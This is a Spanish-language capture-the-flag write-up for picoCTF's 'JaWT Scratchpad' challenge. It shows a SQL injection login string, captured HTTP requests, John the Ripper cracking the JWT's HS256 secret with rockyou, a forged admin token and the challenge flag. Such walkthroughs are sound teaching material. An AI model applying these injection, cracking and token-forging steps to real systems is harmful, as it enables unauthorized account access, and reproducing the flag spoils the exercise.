# JaWT Scratchpad

## Descripcion
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864
## Solucion
Nos conectamos al sitio que nos proporciona el link y vemos que nos pide que iniciemos sesion como admin, entonces probamos usando `admin` y nos dice que no nos podemos loggear asi, probamos usando una inyeccion sql: 
```sql
admin' or 1=1--
```
Y vemos que esta vez si nos pemitio acceder, pero realmente no vemos nada interesante, vamos a burpusite para ver como es que se realiza la peticion y ver si esto nos da alguna pista:
Cuando ingresamos como admin:
```
POST /problem/61864/ HTTP/1.1
Host: jupiter.challenges.picoctf.org
Content-Length: 24
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://jupiter.challenges.picoctf.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://jupiter.challenges.picoctf.org/problem/61864/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

user=admin%27+or+1%3D1--
```
Cuando ya somos admin:
```
GET /problem/61864/ HTTP/1.1
Host: jupiter.challenges.picoctf.org
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4nIG9yIDE9MS0tIn0.eSN-wAvaWMmD0imnj5Lzbxm0YuN5se92LqwaRqhaA3g
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://jupiter.challenges.picoctf.org/problem/61864/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```
Y vemos que hay una cookie jwt, por lo cual ahora buscamos una herramienta online para ver que contiene:
Vemos que nos devuelve un header con:
```
{
  "typ": "JWT",
  "alg": "HS256"
}
```
Y un payload:
```
{
  "user": "admin' or 1=1--"
}
```
Pero nadamas, entonces probamos a cambiar la cookie tal cual escribiendo "admin", y vemos que al guardarla, nos da error, esto se debe a que el jwt tiene una firma de seguridad.
Viendo las pistas y el link al que hace referencia la propia pagina, talvez debamos de hacer un ataque de fuerza bruta para averiguar cual es el 'secret' que se uso, para lo cual tomamos la cookie original que teniamos y hacemos uso de JohnTheRipper:
Vamos a usar rockyou
```sh
┌──(xrengariox㉿PC)-[~/Downloads]
└─$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4nIG9yIDE9MS0tIn0.eSN-wAvaWMmD0imnj5Lzbxm0YuN5se92LqwaRqhaA3g" >> jwt

┌──(xrengariox㉿PC)-[~/Downloads]
└─$ john jwt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:00 DONE (2025-03-29 20:00) 1.538g/s 11393Kp/s 11393Kc/s 11393KC/s iluve.p..ilovejesus789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
Nos dice que se uso la palabra ilovepico, entonces ahora vamos a un encoder de jwt y le decimos que use esa palabra como firma, nos devuelve la siguiente cookie:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.wM6gp2b10dfxTFrAmGoeSSo2LDGyJyKYHh7IrxIc-KA
```
La pegamos en la pagina, y el sitio nos devuelve la flag:

```flag
picoCTF{jawt_was_just_what_you_thought_1ca14548}
```

## Notas adicionales

## Referencias
https://jwt.io
https://10015.io/tools/jwt-encoder-decoder
